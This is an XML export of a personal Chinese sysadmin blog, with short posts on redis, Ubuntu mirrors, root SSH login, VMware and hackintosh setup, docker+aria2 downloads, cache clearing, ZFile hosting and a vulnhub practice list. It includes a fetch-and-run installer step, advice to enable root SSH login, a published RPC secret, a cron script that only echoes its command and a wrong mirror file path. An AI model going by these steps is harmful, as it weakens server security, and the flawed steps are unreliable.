<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>使用命令<code>/etc/init.d/redis-server stop</code>直接关闭redis服务。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@dana:~# /etc/init.d/redis-server stop</span><br><span class="line">[ ok ] Stopping redis-server (via systemctl): redis-server.service.</span><br><span class="line">root@dana:~# ps -ef |grep redis</span><br><span class="line">root       3885   2276  0 09:17 pts/0    00:00:00 grep --color=auto redis</span><br></pre></td></tr></table></figure>
<p>原因是：开了redis的守护进程，<code>kill -9</code>和<code>redis-cli shutdown</code>命令是无法杀掉redis进程的 ，杀掉就会重新启动一个新的进程。</p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://blog.csdn.net/u011191042/article/details/84528502">https://blog.csdn.net/u011191042/article/details/84528502</a></p>
]]></content>
      <categories>
        <category>redis数据库</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
        <tag>redis进程杀不完</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu镜像源改为国内清华源</title>
    <url>//posts/ZH-CN/Ubuntu_Img_Modify.html</url>
    <content><![CDATA[<h2 id="查看ubuntu版本号"><a href="#查看ubuntu版本号" class="headerlink" title="查看ubuntu版本号"></a>查看ubuntu版本号</h2><p><code>lsb_release -a</code></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="更改镜像源"><a href="#更改镜像源" class="headerlink" title="更改镜像源"></a>更改镜像源</h2><p>在<a href="https://mirror.tuna.tsinghua.edu.cn/help/ubuntu/">清华镜像源网站</a>找到对应ubuntu版本的镜像源配置方式，修改镜像源配置文件<code>/etc/apt/source_list</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc9u850vm6j31f60u0dk1.jpg" alt="image.png"><br>改了镜像源之后。执行这两条命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get dist-upgrade</span><br></pre></td></tr></table></figure>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://blog.csdn.net/inslow/article/details/54378350">https://blog.csdn.net/inslow/article/details/54378350</a><br><a href="https://mirror.tuna.tsinghua.edu.cn/help/ubuntu/">https://mirror.tuna.tsinghua.edu.cn/help/ubuntu/</a><br><a href="https://blog.csdn.net/mybelief321/article/details/9076331">https://blog.csdn.net/mybelief321/article/details/9076331</a></p>
]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>ubuntu镜像源更改</tag>
        <tag>清华镜像源</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu设置允许root远程登录ssh</title>
    <url>//posts/ZH-CN/Ubuntu_Root_Ssh_Login.html</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>无法用root用户登录ssh。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>修改ssh配置文件<code>/etc/ssh/sshd_config</code>，加上<code>PermitRootLogin yes</code>，之后重启ssh服务：<code>sudo service sshd restart</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcb0ee96z1j30oq0iujsu.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://blog.csdn.net/wy_97/article/details/78294562">https://blog.csdn.net/wy_97/article/details/78294562</a></p>
]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>允许root远程登录ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>vmware workstation 15安装unbuntu19.10</title>
    <url>//posts/ZH-CN/Vmware15_Install_Ubuntu19.10.html</url>
    <content><![CDATA[<h2 id="虚拟机设置"><a href="#虚拟机设置" class="headerlink" title="虚拟机设置"></a>虚拟机设置</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8fpkwpn9j30fu0fbq42.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8fqkv759j30fu0fbweu.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8fr76l7ij30fu0fbjrt.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8fscibbkj30fu0fbjrl.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8ftcyzguj30fu0fb0sx.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8fueqbayj30fu0fbq34.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8fz6jn5cj30fu0fbaag.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8fzlxiyoj30fu0fbq3d.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8g02tfx5j30fu0fbq37.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8g0gcy8aj30fu0fbq34.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8g1hh29aj30fu0fb0t6.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8g27p2f8j30fu0fbgm3.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8g2n0rrij30fu0fbmxc.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8g32nramj30fu0fbaae.jpg" alt="image.png"></p>
<h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8g6cy3bhj31f60u0ac5.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8g71oy3uj31f60u0gnq.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8g7rzmm9j31f60u0ac3.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8g8g4tslj31f60u0mzb.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8g99avmwj31f60u0q52.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8g9u5hupj31f60u0jtf.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8gah1gfnj31f60u0ac5.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8gayoyzsj31f60u076c.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8gbnp6xrj31f60u0q56.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8gcc0j6rj31f60u076o.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8gdo72ojj31f60u0wgo.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8gebey03j31f60u0tar.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8gf41xrej31f60u0n0l.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8gflrey5j31f60u0419.jpg" alt="image.png"></p>
<h2 id="更新升级"><a href="#更新升级" class="headerlink" title="更新升级"></a>更新升级</h2><ul>
<li><code>sudo apt-get update</code></li>
<li><code>sudo apt-get upgrade</code></li>
</ul>
]]></content>
      <categories>
        <category>安装教程</category>
      </categories>
      <tags>
        <tag>安装教程</tag>
        <tag>vmware安装ubuntu虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>vmware workstation怎么打开vmdk格式的虚拟机</title>
    <url>//posts/ZH-CN/Vmware_Vmdk.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从网上下载了Kioptrix level 4的镜像，解压出来是<code>.vmdk</code>后缀的文件，这个文件无法直接用vmware workstation打开。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>新建虚拟机，把vmdk文件导入磁盘。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc9y665x1rj30fu0fbmya.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc9yb4v61fj30fu0fbweu.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc9ybip5qfj30fu0fbweu.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc9yc7zl2gj30fu0fbt8z.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc9ydks06lj30fu0fbt8x.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc9ye4e5b6j30fu0fbt8w.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gca3nwd01ij30fu0fb3yy.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gca3oh33v1j30fu0fbjrn.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gca3p5hxdvj30fu0fbjrk.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gca3pr0aclj30fu0fbaai.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gca3qkre4fj30fu0fbgls.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gca3r660c4j30fu0fbdgg.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gca3rloat9j30fu0fbq3a.jpg" alt="image.png"><br>最后，成功打开虚拟机。</p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://blog.51cto.com/lovelace/969698">https://blog.51cto.com/lovelace/969698</a></p>
]]></content>
      <categories>
        <category>安装教程</category>
      </categories>
      <tags>
        <tag>vmware workstation</tag>
        <tag>打开vmdk格式的虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>vmware黑苹果调整分辨率</title>
    <url>//posts/ZH-CN/Vmware_BlackApple_Resolution.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>黑苹果虽然装好了，但是分辨率需要调整，字体显得太大了</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>分辨率设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">danadeMac:~ dana$ sudo nvram AC20C489-DD86-4E99-992C-B7C742C1DDA9:width=%80%07%00%00</span><br><span class="line">Password:</span><br><span class="line">danadeMac:~ dana$ sudo nvram AC20C489-DD86-4E99-992C-B7C742C1DDA9:height=%38%04%00%00</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrjb1o4pej30nw0q30ty.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://www.dkukoc.com/post/226.html">https://www.dkukoc.com/post/226.html</a></p>
]]></content>
      <categories>
        <category>黑苹果</category>
      </categories>
      <tags>
        <tag>vmware黑苹果</tag>
        <tag>调整分辨率</tag>
      </tags>
  </entry>
  <entry>
    <title>vmware黑苹果无法从win10宿主机复制文件</title>
    <url>//posts/ZH-CN/Vmware_Win10_Copy_File.html</url>
    <content><![CDATA[<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>太喜欢这个背景图了~<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcsamv5vxbj31f60pd1kz.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>进入系统偏好设置的安全设置，在辅助功能里面，启用vmtools。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcsdv32dmzj30ij0g20u8.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcsdx7azaij31f60u0qv5.jpg" alt="image.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个问题，好伤人……解决方法就这么简单。我还反复装了好多次vmtools，换了各种版本的iso镜像。</p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://www.bilibili.com/read/cv3041419/">https://www.bilibili.com/read/cv3041419/</a></p>
]]></content>
      <categories>
        <category>问题解决</category>
        <category>黑苹果</category>
      </categories>
      <tags>
        <tag>vmware黑苹果</tag>
        <tag>从win10宿主机复制文件</tag>
      </tags>
  </entry>
  <entry>
    <title>vps使用docker+aria2自建离线下载并推送到onedrive和googledrive</title>
    <url>//posts/ZH-CN/vps-personal-cloud-aria2-docker-onedrive-googledrive.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>aria2是一款常用的离线下载软件，我们利用aria2离线下载的特点，在vps（vps在国外）安装aria2，就可以飞速下载各种资源。这里我们用大神制作的docker镜像。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># curl -fsSL https://get.docker.com -o get-docker.sh</span></span><br><span class="line">root@vultr:~<span class="comment"># sh get-docker.sh</span></span><br></pre></td></tr></table></figure>
<h3 id="拉取docker镜像并设置自动上传至网盘"><a href="#拉取docker镜像并设置自动上传至网盘" class="headerlink" title="拉取docker镜像并设置自动上传至网盘"></a>拉取docker镜像并设置自动上传至网盘</h3><h4 id="下载内容自动上传到onedrive"><a href="#下载内容自动上传到onedrive" class="headerlink" title="下载内容自动上传到onedrive"></a>下载内容自动上传到onedrive</h4><h5 id="开启docker容器"><a href="#开启docker容器" class="headerlink" title="开启docker容器"></a>开启docker容器</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d     --name aria2-onedrive     --restart unless-stopped     --log-opt max-size=1m     --network host     -e PUID=$UID     -e PGID=$GID     -e RPC_SECRET=dana5haw     -e RPC_PORT=6803     -e LISTEN_PORT=33333     -v ~/aria2-onedrive-config:/config     -v ~/onedrive-downloads:/downloads     -e RCLONE=enable     p3terx/aria2-pro</span><br></pre></td></tr></table></figure>
<p>docker容器开启之后，将自动生成<code>aria2-onedrive-config</code>（aria2配置文件）和<code>onedrive-downloads</code>（aria2下载路径）这两个目录。</p>
<h5 id="rclone连接onedrive"><a href="#rclone连接onedrive" class="headerlink" title="rclone连接onedrive"></a>rclone连接onedrive</h5><p>自动上传到onedrive网盘，我们用到了rclone去连接网盘。<br>输入以下命令进行rclone的配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it aria2-onedrive rclone config</span><br></pre></td></tr></table></figure>
<p>配置详情参考<a href="https://p3terx.com/archives/docker-aria2-pro.html">这篇教程</a></p>
<h5 id="设置aria2自动上传配置文件"><a href="#设置aria2自动上传配置文件" class="headerlink" title="设置aria2自动上传配置文件"></a>设置aria2自动上传配置文件</h5><p>配置文件目录位于<code>aria2-onedrive-config</code>，主要修改<code>autoupload.sh</code>（rclone自动上传相关的设置）。<br>设置Onedrive网盘的保存路径（文件下载之后，会存到Onedrive的根目录）。<br><a href="https://v2ray.dana5haw.com:8008/image/gC9y"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/01/imagef16429ce0fc55698.png" alt="imagef16429ce0fc55698.png"></a></p>
<h4 id="下载内容自动上传到googledrive"><a href="#下载内容自动上传到googledrive" class="headerlink" title="下载内容自动上传到googledrive"></a>下载内容自动上传到googledrive</h4><h5 id="开启docker容器-1"><a href="#开启docker容器-1" class="headerlink" title="开启docker容器"></a>开启docker容器</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d     --name aria2-gdrive     --restart unless-stopped     --log-opt max-size=1m     --network host     -e PUID=$UID     -e PGID=$GID     -e RPC_SECRET=dana5haw     -e RPC_PORT=6804     -e LISTEN_PORT=44444     -v ~/aria2-gdrive-config:/config     -v ~/gdrive-downloads:/downloads     -e RCLONE=enable     p3terx/aria2-pro</span><br></pre></td></tr></table></figure>
<p>docker容器开启之后，将自动生成<code>aria2-gdrive-config</code>（aria2配置文件）和<code>gdrive-downloads</code>（aria2下载路径）这两个目录。</p>
<h5 id="rclone连接googledrive"><a href="#rclone连接googledrive" class="headerlink" title="rclone连接googledrive"></a>rclone连接googledrive</h5><p>自动上传到googledrive网盘，我们用到了rclone去连接网盘。<br>输入以下命令进行rclone的配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it aria2-gdrive rclone config</span><br></pre></td></tr></table></figure>
<p>配置详情参考<a href="https://p3terx.com/archives/docker-aria2-pro.html">这篇教程</a></p>
<h5 id="设置aria2自动上传配置文件-1"><a href="#设置aria2自动上传配置文件-1" class="headerlink" title="设置aria2自动上传配置文件"></a>设置aria2自动上传配置文件</h5><p>配置文件目录位于<code>aria2-gdrive-config</code>，主要修改<code>autoupload.sh</code>（rclone自动上传相关的设置）。<br>设置googledrive网盘的保存路径（文件下载之后，会存到googledrive的根目录）。<br><a href="https://v2ray.dana5haw.com:8008/image/gaJA"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/01/imagebde25e618fa86e0f.png" alt="imagebde25e618fa86e0f.png"></a></p>
<h3 id="本地电脑安装ariaNG实现离线下载"><a href="#本地电脑安装ariaNG实现离线下载" class="headerlink" title="本地电脑安装ariaNG实现离线下载"></a>本地电脑安装ariaNG实现离线下载</h3><p>使用方法参考<a href="https://p3terx.com/archives/aria2-frontend-ariang-tutorial.html">这篇教程</a><br><a href="https://p3terx.com/go/aHR0cHM6Ly9naXRodWIuY29tL21heXN3aW5kL0FyaWFOZy9yZWxlYXNlcy9sYXRlc3Q=">ariaNG下载链接，选择all-in-one版本</a><br><a href="https://v2ray.dana5haw.com:8008/image/gns9"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/01/image3c3422cfcb008405.png" alt="image3c3422cfcb008405.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/gvdO"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/01/imageffcedf6f4ad4f144.png" alt="imageffcedf6f4ad4f144.png"></a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>主要参考<a href="https://p3terx.com/archives/docker-aria2-pro.html">这篇文章</a></p>
]]></content>
      <categories>
        <category>vps</category>
        <category>私人网盘</category>
      </categories>
      <tags>
        <tag>离线下载</tag>
        <tag>docker+aria2</tag>
        <tag>onedrive/googledrive</tag>
      </tags>
  </entry>
  <entry>
    <title>vps内存优化之清理内存</title>
    <url>//posts/ZH-CN/vps-memory-better.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>vps的内存本身不大，缓存就占了1.4G，必须得清理了。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="优化内存的方法"><a href="#优化内存的方法" class="headerlink" title="优化内存的方法"></a>优化内存的方法</h2><p>过程:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># free -mh</span></span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:           1.9G        197M        357M        752K        1.4G        1.6G</span><br><span class="line">Swap:            0B          0B          0B</span><br><span class="line">root@vultr:~<span class="comment"># sync; echo 1 &gt; /proc/sys/vm/drop_caches</span></span><br><span class="line">root@vultr:~<span class="comment"># free -mh</span></span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:           1.9G        196M        1.5G        752K        267M        1.6G</span><br><span class="line">Swap:            0B          0B          0B</span><br><span class="line">root@vultr:~<span class="comment"># sync; echo 2 &gt; /proc/sys/vm/drop_caches</span></span><br><span class="line">root@vultr:~<span class="comment"># free -mh</span></span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:           1.9G        193M        1.6G        752K        166M        1.6G</span><br><span class="line">Swap:            0B          0B          0B</span><br></pre></td></tr></table></figure>
<blockquote>
<p>说明：</p>
</blockquote>
<ul>
<li>仅清除页面缓存（PageCache）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sync; echo 1 &gt; /proc/sys/vm/drop_caches</span><br></pre></td></tr></table></figure></li>
<li>清除目录项和inode<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sync; echo 2 &gt; /proc/sys/vm/drop_caches</span><br></pre></td></tr></table></figure></li>
<li>清除页面缓存，目录项和inode<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sync; echo 3 &gt; /proc/sys/vm/drop_caches</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>创建crontab定期清理缓存</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># vi clearcache.sh</span></span><br><span class="line">root@vultr:~<span class="comment"># chmod 755 clearcache.sh</span></span><br></pre></td></tr></table></figure>
<p>脚本内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo &quot;echo 1 &gt; /proc/sys/vm/drop_caches&quot;</span><br></pre></td></tr></table></figure>
<p>创建crontab：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># crontab -e</span></span><br><span class="line">no crontab <span class="keyword">for</span> root - using an empty one</span><br><span class="line"></span><br><span class="line">Select an editor.  To change later, run <span class="string">&#x27;select-editor&#x27;</span>.</span><br><span class="line">  1. /bin/nano        &lt;---- easiest</span><br><span class="line">  2. /usr/bin/vim.basic</span><br><span class="line">  3. /usr/bin/vim.tiny</span><br><span class="line">  4. /bin/ed</span><br><span class="line"></span><br><span class="line">Choose 1-4 [1]: 3</span><br></pre></td></tr></table></figure>
<p>crontab的内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 3 * * * /root/clearcache.sh</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考<a href="https://colobu.com/2015/10/31/How-to-Clear-RAM-Memory-Cache-Buffer-and-Swap-Space-on-Linux/">这篇文章</a></p>
]]></content>
      <categories>
        <category>vps</category>
      </categories>
      <tags>
        <tag>vps</tag>
        <tag>内存优化</tag>
      </tags>
  </entry>
  <entry>
    <title>vps自建私人网盘-开源软件ZFile</title>
    <url>//posts/ZH-CN/vps-personal-cloud-ZFile.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有一台vps，就老想着玩，装一个私人网盘玩一玩，使用了一款新秀开源软件ZFile。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><h3 id="安装预备工具"><a href="#安装预备工具" class="headerlink" title="安装预备工具"></a>安装预备工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># apt install -y openjdk-8-jre-headless unzip</span></span><br></pre></td></tr></table></figure>
<h3 id="下载及安装"><a href="#下载及安装" class="headerlink" title="下载及安装"></a>下载及安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># wget -P ~ https://c.jun6.net/ZFILE/zfile-release.war</span></span><br><span class="line">root@vultr:~<span class="comment"># mkdir zfile &amp;&amp; unzip zfile-release.war -d zfile &amp;&amp; rm -rf zfile-release.war</span></span><br><span class="line">root@vultr:~<span class="comment"># chmod +x ~/zfile/bin/*.sh</span></span><br></pre></td></tr></table></figure>
<p>修改默认端口（默认端口是8080）：<br><a href="https://v2ray.dana5haw.com:8008/image/gZGQ"><img src="https://v2ray.dana5haw.com:8008/images/2020/03/25/imagefc2446af0d7b9838.png" alt="imagefc2446af0d7b9838.png"></a></p>
<h3 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h3><p>注意，我们新开了8088端口用于软件安装。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># ~/zfile/bin/start.sh</span></span><br><span class="line">root@vultr:~<span class="comment"># ufw allow 8088</span></span><br></pre></td></tr></table></figure>
<p>浏览器输入IP+端口，进入后台配置。<br><a href="https://v2ray.dana5haw.com:8008/image/gIqu"><img src="https://v2ray.dana5haw.com:8008/images/2020/03/25/imagea4a1f1078a6141e8.png" alt="imagea4a1f1078a6141e8.png"></a></p>
<h3 id="绑定域名访问"><a href="#绑定域名访问" class="headerlink" title="绑定域名访问"></a>绑定域名访问</h3><p>首先到域名提供商官网创建子域名，A记录绑定到vps的IP。<br><a href="https://v2ray.dana5haw.com:8008/image/gh9c"><img src="https://v2ray.dana5haw.com:8008/images/2020/03/25/image3bd97719bea91355.png" alt="image3bd97719bea91355.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/gl6d"><img src="https://v2ray.dana5haw.com:8008/images/2020/03/25/imagef478b67571d842c5.png" alt="imagef478b67571d842c5.png"></a></p>
<h3 id="申请https证书"><a href="#申请https证书" class="headerlink" title="申请https证书"></a>申请https证书</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># certbot certonly --manual --preferred-challenge dns -d cloud.dana5haw.com</span></span><br></pre></td></tr></table></figure>
<p>在安装过程中，需要在域名提供商官网设置一个TXT记录。<br><a href="https://v2ray.dana5haw.com:8008/image/gosT"><img src="https://v2ray.dana5haw.com:8008/images/2020/03/25/image0bc7b118868ffeaa.png" alt="image0bc7b118868ffeaa.png"></a><br>输入以下命令，检查TXT记录是否生效：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># dig -t txt _acme-challenge.cloud.dana5haw.com</span></span><br></pre></td></tr></table></figure>
<p>安装完成后，会在服务器本地生成公钥和私钥证书。<br><del>……这次不知道为什么，TXT记录老是没有生效。<br>先吃饭……</del><br>因为设置的子域名不对，子域名应该是这种格式<code>_acme-challenge.cloud</code>。<br>现在已经申请到了https证书。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://github.jun6.net/zfile-readme/">作者写的安装文档</a></p>
]]></content>
      <categories>
        <category>vps</category>
        <category>私人网盘</category>
      </categories>
      <tags>
        <tag>vps</tag>
        <tag>私人网盘</tag>
        <tag>ZFile</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透学习计划</title>
    <url>//posts/ZH-CN/Vulnhub_Study_Plan.html</url>
    <content><![CDATA[<h2 id="靶机渗透练习计划"><a href="#靶机渗透练习计划" class="headerlink" title="靶机渗透练习计划"></a>靶机渗透练习计划</h2><p>用靶机渗透练习入门渗透，先实践，再了解理论。我这人有一股执着劲，不管什么，都希望先做，不太喜欢听空洞的大道理。一件事的结局好不好，只有做了才知道。就算判断错了，也是自己亲自获取的经验。</p>
<p><escape> <span id="more"></span></escape></p>
<ul>
<li>Kioptrix: Level 1 (#1): <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</a></li>
<li>Kioptrix: Level 1.1 (#2): <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">https://www.vulnhub.com/entry/kioptrix-level-11-2,23/</a></li>
<li>Kioptrix: Level 1.2 (#3): <a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">https://www.vulnhub.com/entry/kioptrix-level-12-3,24/</a></li>
<li>Kioptrix: Level 1.3 (#4): <a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25">https://www.vulnhub.com/entry/kioptrix-level-13-4,25</a></li>
<li>Kioptrix: 2014: <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">https://www.vulnhub.com/entry/kioptrix-2014-5,62/</a></li>
<li>FristiLeaks 1.3: <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">https://www.vulnhub.com/entry/fristileaks-13,133/</a></li>
<li>Stapler 1: <a href="https://www.vulnhub.com/entry/stapler-1,150/">https://www.vulnhub.com/entry/stapler-1,150/</a></li>
<li>VulnOS 2: <a href="https://www.vulnhub.com/entry/vulnos-2,147/">https://www.vulnhub.com/entry/vulnos-2,147/</a></li>
<li>SickOs 1.2: <a href="https://www.vulnhub.com/entry/sickos-12,144/">https://www.vulnhub.com/entry/sickos-12,144/</a></li>
<li>Brainpan 1: <a href="https://www.vulnhub.com/entry/brainpan-1,51/">https://www.vulnhub.com/entry/brainpan-1,51/</a></li>
<li>HackLAB: Vulnix: <a href="https://www.vulnhub.com/entry/hacklab-vulnix,48/">https://www.vulnhub.com/entry/hacklab-vulnix,48/</a></li>
<li>/dev/random: scream: <a href="https://www.vulnhub.com/entry/devrandom-scream,47/">https://www.vulnhub.com/entry/devrandom-scream,47/</a></li>
